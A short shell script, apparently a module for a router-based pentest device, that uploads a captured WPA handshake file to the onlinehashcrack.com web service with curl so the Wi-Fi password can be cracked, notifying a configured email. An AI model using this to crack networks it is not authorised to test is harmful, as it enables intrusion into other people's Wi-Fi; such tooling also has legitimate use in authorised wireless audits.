#!/bin/sh

[[ -f /tmp/HandshakeCrack.progress ]] && {
  exit 0
}

EMAIL=`uci get handshakecrack.settings.email`
FILE=$1

touch /tmp/HandshakeCrack.progress

if [[ -n "$EMAIL" ]]; then
  if [[ ! -f ${FILE} ]]; then
    echo -e "File ${FILE} does not exist."
  else
    echo -e "Sent to www.onlinehashcrack.com web service successfully."
    echo -e "Notification will be sent to ${EMAIL}"
    echo -e "The following has been sent: ${FILE}"

    curl -s -v -F submit="Submit" -F emailTask="${EMAIL}" -F file=@${FILE} https://www.onlinehashcrack.com/addtask.php
  fi
else
  echo -e "Notification email not set in settings."
fi

rm /tmp/HandshakeCrack.progress
